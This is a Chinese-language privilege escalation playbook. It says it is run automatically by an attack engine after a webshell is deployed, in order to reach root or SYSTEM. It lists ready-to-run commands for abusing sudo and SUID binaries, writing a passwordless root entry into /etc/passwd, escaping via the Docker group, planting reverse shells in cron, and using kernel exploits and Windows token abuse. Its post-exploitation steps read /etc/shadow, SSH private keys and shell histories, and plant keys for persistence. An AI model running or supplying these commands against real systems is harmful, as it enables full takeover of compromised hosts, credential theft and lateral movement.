# 权限提升指南 (Privilege Escalation Guide)

## 文件用途

当 attack_engine.py 部署 webshell 成功后，自动执行本文档中的权限提升检查。
目标：从 www-data/apache/tomcat → root/SYSTEM

---

## Linux 提权决策树

```
拿到 webshell (www-data / apache / tomcat / nobody)
│
├─ 1. sudo -l
│   ├─ (ALL) NOPASSWD: ALL → 直接 sudo su → ROOT ✅
│   ├─ (root) NOPASSWD: /usr/bin/vim → sudo vim -c ':!/bin/sh' → ROOT ✅
│   ├─ (root) NOPASSWD: /usr/bin/find → sudo find / -exec /bin/sh \; → ROOT ✅
│   ├─ (root) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'import os;os.system("/bin/sh")' → ROOT ✅
│   └─ 其他受限sudo → 记录，继续下一步
│
├─ 2. SUID 二进制文件
│   ├─ find (SUID) → find . -exec /bin/sh -p \; → ROOT ✅
│   ├─ bash (SUID) → bash -p → ROOT ✅
│   ├─ python (SUID) → python -c 'import os;os.execl("/bin/sh","sh","-p")' → ROOT ✅
│   ├─ vim (SUID) → vim -c ':py3 import os;os.execl("/bin/sh","sh","-p")' → ROOT ✅
│   ├─ systemctl (SUID) → 创建恶意service → ROOT ✅
│   └─ 无可用SUID → 继续下一步
│
├─ 3. Capabilities
│   ├─ cap_setuid+ep → 提权脚本 → ROOT ✅
│   ├─ cap_sys_admin+ep → 挂载利用 → ROOT ✅
│   ├─ cap_sys_ptrace+ep → 注入root进程 → ROOT ✅
│   └─ 无可利用cap → 继续下一步
│
├─ 4. Cron Jobs
│   ├─ /etc/crontab 可写 → 写入反弹shell → ROOT ✅
│   ├─ cron.d/ 可写 → 写入定时任务 → ROOT ✅
│   ├─ root权限的cron脚本可写 → 注入命令 → ROOT ✅
│   └─ 无可利用cron → 继续下一步
│
├─ 5. Writable /etc/passwd
│   ├─ /etc/passwd 可写 → echo "root2::0:0::/root:/bin/bash" >> /etc/passwd → ROOT ✅
│   └─ 不可写 → 继续下一步
│
├─ 6. Docker
│   ├─ 用户在docker组 → docker run -v /:/mnt -it alpine chroot /mnt → ROOT ✅
│   └─ 不在docker组 → 继续下一步
│
├─ 7. NFS
│   ├─ no_root_squash → 挂载NFS,cp /bin/bash → SUID bash → ROOT ✅
│   └─ 无NFS → 继续下一步
│
└─ 8. Kernel Exploit
    ├─ 内核版本 < 5.8 → DirtyPipe (CVE-2022-0847)
    ├─ 内核版本 < 5.15 → PwnKit (CVE-2021-4034)
    ├─ 内核版本 < 4.4 → DirtyCow (CVE-2016-5195)
    └─ 参考: https://github.com/mzet-/linux-exploit-suggester
```

## sudo 滥用速查表

| sudo 权限 | 提权命令 |
|-----------|---------|
| `(ALL) NOPASSWD: ALL` | `sudo su -` |
| `(root) vim` | `sudo vim -c ':!/bin/sh'` |
| `(root) nano` | `sudo nano -s /bin/sh` |
| `(root) less` | `sudo less /etc/passwd` → `!/bin/sh` |
| `(root) find` | `sudo find /etc/passwd -exec /bin/sh \;` |
| `(root) awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `(root) man` | `sudo man man` → `!/bin/sh` |
| `(root) python3` | `sudo python3 -c 'import os; os.system("/bin/sh")'` |
| `(root) perl` | `sudo perl -e 'exec "/bin/sh"'` |
| `(root) tar` | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `(root) zip` | `sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"` |
| `(root) nmap` | `echo 'os.execute("/bin/sh")' > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse` |
| `(root) git` | `sudo git -p help config` → `!/bin/sh` |
| `(root) systemctl` | `sudo systemctl --no-block --user restart evil.service` |
| `(root) apt/apt-get` | `sudo apt-get changelog apt` → `!/bin/sh` |
| `(root) tcpdump` | `echo id > /tmp/test; sudo tcpdump -ln -w /dev/null -W 1 -G 1 -z /tmp/test -Z root` |

## SUID 利用速查表

| SUID 二进制 | 提权命令 |
|-------------|---------|
| find | `./find . -exec /bin/sh -p \; -quit` |
| bash | `./bash -p` |
| python | `./python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| vim | `./vim -c ':py3 import os; os.execl("/bin/sh","sh")'` |
| systemctl | 创建恶意service并启用 |
| cp | `./cp /bin/bash /tmp/bash && chmod u+s /tmp/bash && /tmp/bash -p` |
| mv | `./mv /bin/bash /tmp/bash && ...` |
| php | `./php -r "pcntl_exec('/bin/sh', ['-p']);"` |
| ruby | `./ruby -e 'exec "/bin/sh -p"'` |
| perl | `./perl -e 'exec "/bin/sh -p"'` |
| node | `./node -e 'require("child_process").spawn("/bin/sh",["-p"],{stdio:"inherit"})'` |

## Windows 提权决策树

```
拿到 webshell (IIS APPPOOL\DefaultAppPool / NT AUTHORITY\NETWORK SERVICE)
│
├─ 1. whoami /priv
│   ├─ SeImpersonatePrivilege → JuicyPotato/RoguePotato/PrintSpoofer → SYSTEM ✅
│   ├─ SeAssignPrimaryTokenPrivilege → Potato系列 → SYSTEM ✅
│   ├─ SeBackupPrivilege → 复制SAM/SYSTEM → 提取hash → SYSTEM ✅
│   ├─ SeRestorePrivilege → 劫持服务 → SYSTEM ✅
│   ├─ SeDebugPrivilege → 注入LSASS → SYSTEM ✅
│   └─ 无可用特权 → 继续下一步
│
├─ 2. 服务权限
│   ├─ AlwaysInstallElevated=1 → MSI安装包提权 → SYSTEM ✅
│   ├─ 服务可写/可启动 → 修改服务binPath → SYSTEM ✅
│   ├─ 服务引号未闭合 → 路径劫持 → SYSTEM ✅
│   └─ 无可利用服务 → 继续下一步
│
├─ 3. UAC Bypass
│   ├─ fodhelper.exe (Windows 10/11)
│   ├─ eventvwr.exe (Windows 10)
│   ├─ cmstp.exe (Windows 10)
│   └─ computerdefaults.exe (Windows 10)
│
└─ 4. 其他
    ├─ 计划任务(可写) → SYSTEM ✅
    ├─ 自启动目录可写 → 用户登录时执行 ✅
    ├─ 注册表Run键可写 → 持久化 → 高权限用户登录时执行 ✅
    └─ 凭据窃取 → 密码复用 → 高权限用户 ✅
```

## 提权后操作

```
1. 读取 /etc/shadow → hashcat 破解更多密码
2. 读取 ~/.ssh/id_rsa → SSH横向移动
3. 读取 ~/.bash_history → 发现更多凭据
4. 读取 /etc/hosts → 发现内网资产
5. ifconfig/netstat -rn → 发现其他网段
6. arp -a → ARP表 → 内网存活主机
7. ps aux → 关键进程 → 注入目标
8. find / -name "*.conf" → 数据库密码等
9. cat /root/.bash_history → root最近操作
10. 部署SSH公钥 → 持久化访问
```
